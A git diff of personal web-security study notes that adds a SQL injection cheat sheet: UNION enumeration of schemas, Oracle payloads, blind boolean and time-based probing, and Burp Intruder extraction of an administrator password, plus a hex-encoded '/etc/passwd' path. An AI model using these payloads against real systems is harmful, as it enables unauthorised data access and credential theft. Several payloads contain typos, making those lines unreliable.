@@ -16,6 +16,9 @@
   - [XSS](#xss)
   - [Command injection](#command-injection)
   - [database](#database)
+    - [Steps](#steps)
+    - [Find data oracle](#find-data-oracle)
+    - [blind](#blind)
 - [burpsuite](#burpsuite)
   - [Repeater](#repeater)
   - [Intruder](#intruder)
@@ -183,7 +186,20 @@ Insecure Direct Object Request
 - $payload = "\x2f\x65\x74\x2f\x70\x61\x73\x73\x77\x64"
 
 ## database
-- --; ==> terminate + anything else is comment
+
+### Steps
+- find vulnerability: ', "
+- find total columns: UNION SELECT NULL,NULL,NULL
+- find name of db: UNION SELECT NULL,NULL,database()
+- find tables: UNION SELECT NULL,NULL,table_name from **information_schema.tables** WHERE table_schema = 'DB name'
+- find columns in table: UNION SELECT NULL,NULL,column_name FROM **information_schema.columns** WHERE table_name= 'Table name'
+- find data: UNION SELECT NULL,NULL,group_concat(column,column,column) from table_nae
+
+- for login: 'or 1=1 (always true) ;-- [comments]
+
+- - --; ==> terminate + anything else is comment
+- '# ==> also comment
+- In Burp separate with +
 - id=2' ==> produce error
 - 1 union 1,x,y,z ==> find how many columns
 - 0 union 1,2,database() = database name
@@ -191,16 +207,45 @@ Insecure Direct Object Request
     - information_schema = info about all databases and tables
   - 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name' = find existing columns inside table
   - 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users = diplay table
+  - 
 
-- blind
-  - binary
-    - admin123' UNION SELECT 1,2,3 where database() like '[]%';-- ==> wildcard name start with [here], try and error until true, brute force
-    - admin123' UNION SELECT 1,2, [sleep(4)] 3 FROM information_schema.tables WHERE table_schema = 'db_name' and table_name like '%';-- ==> brute force to find table name
-    - admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' and table_name='table_name';-- ==> brute force 
-    - next step = brute forte to find columns = admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='db_name' and TABLE_NAME='table_name' and COLUMN_NAME like 'a%';
-    - append correct discoveries: admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='db_name' and TABLE_NAME='table_name' [and COLUMN_NAME like '%a' and COLUMN_NAME!='first_found']
-  - admin123' UNION SELECT 1,2,3 from *table_name* where *column* like 'a%';--
-    - admin123' UNION SELECT 1,2,3 from *table_name* where *column='value'* and *column* like 'a%;-- ==> finding values for more discovered columns
+- Find tables
+  - Using NULL because it is compatible with all date type
+
+- Find version (always UNION)
+  - Microsoft, MySQL	SELECT @@version
+  - Oracle	SELECT * FROM v$version
+  - PostgreSQL	SELECT version()
+
+### Find data oracle
+Oracle DB: '+UNION+SELECT+NULL,NULL+FROM+v$version--
+2 Columns strings: '+UNION+SELECT+'abc','abc'+FROM+v$version--
+Show tables: '+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 
+Show columns: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='table_name'
+Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table-- 
+
+### blind
+- binary
+  -  like a% = starting with a
+  - Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
+  - Find table name: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.tables** WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
+  - find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
+  - find columns 2: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
+  - find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--
+
+  - admin123' UNION SELECT NULL,NULL, [sleep(4)] 3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name like '%';-- ==> brute force to find table name
+
+
+
+
+- Change SQL Command in the trackinID + test
+- Table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a;
+- Size of string: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;==> payload type number to find 1 until n
+- in the intruder: substring method with password list
+' AND (SELECT SUBSTRING(password,X,1) FROM users WHERE username = 'administrator')='§a§;
+ - SUBSTRING(string, start, length)
+ - Cluster Bomb: several $payload$, one for the position_number, one for the string
+ - Brute_force: iterate over given list
 
 
 - time
